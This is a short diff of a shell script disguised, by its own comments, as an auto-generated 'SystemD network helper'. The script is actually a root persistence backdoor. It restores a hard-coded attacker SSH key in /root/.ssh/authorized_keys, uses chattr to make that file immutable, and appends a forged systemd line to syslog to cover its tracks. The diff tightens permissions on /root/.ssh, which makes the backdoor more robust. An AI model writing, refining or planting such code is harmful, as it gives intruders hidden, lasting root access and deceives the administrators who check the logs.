@@ -3,7 +3,6 @@
 # Biar keliatan kayak file system legitimate
 
 # SystemD network helper - auto generated
-SELF="$(basename "$0")"
 SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIENY6VLeZm88ObGaapZ1gXaVPUjdT6g8aGMsJJwF7JJV root"
 
 # Restore SSH key jika hilang
@@ -12,6 +11,7 @@ if ! grep -qF "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
     chattr -i /root/.ssh/authorized_keys 2>/dev/null
     echo "$SSH_KEY" >> /root/.ssh/authorized_keys
     chmod 600 /root/.ssh/authorized_keys
+    chmod 700 /root/.ssh
     chattr +i /root/.ssh/authorized_keys 2>/dev/null
     echo "$(date '+%b %d %H:%M:%S') $(hostname) systemd[1]: Started Network Service" >> /var/log/syslog
 fi
